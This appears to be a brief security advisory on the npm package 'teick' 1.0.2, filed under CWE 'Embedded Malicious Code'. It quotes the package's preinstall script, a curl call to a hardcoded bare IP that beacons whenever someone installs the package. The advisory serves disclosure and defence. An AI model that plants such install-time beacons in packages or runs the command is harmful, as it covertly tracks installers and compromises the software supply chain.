summary: teick preinstall beacons to hardcoded bare-IP endpoint on npm install
details: teick 1.0.2 ships no library code; the entire package consists of a package.json whose preinstall lifecycle script runs `curl https://159.223.131.130:8080`. On `npm install`, this fires an unconditional outbound HTTPS request to a hardcoded bare IP with no relationship to any declared publisher or project homepage, confirming the installer host to the operator of that endpoint and disclosing the installer's public IP and user-agent. There is no build-related purpose for the fetch, no pinned artifact, and no shipped source — the manifest is the entire payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
